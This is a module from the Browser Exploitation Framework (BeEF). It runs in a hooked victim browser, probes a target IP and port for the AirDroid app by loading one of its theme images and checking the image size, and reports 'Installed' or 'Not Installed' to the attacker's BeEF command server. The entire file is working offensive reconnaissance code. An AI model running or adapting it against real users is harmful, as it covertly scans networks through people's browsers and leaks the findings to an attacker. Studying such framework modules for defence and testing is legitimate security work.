//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var result = "Not Installed";
	var dom = document.createElement('b');
	var img = new Image;
	img.src = "http://<%= @ipHost %>:<%= @port %>/theme/stock/images/ip_auth_refused.png";
	img.onload = function() {
		if (this.width == 146 && this.height == 176) result = "Installed";
		beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto=http&ip=<%= @ipHost %>&port=<%= @port %>&airdrone='+result);
		dom.removeChild(this);
	}
	img.onerror = function() {
		beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto=http&ip=<%= @ipHost %>&port=<%= @port %>&airdrone='+result);
		dom.removeChild(this);
	}
	dom.appendChild(img);

});

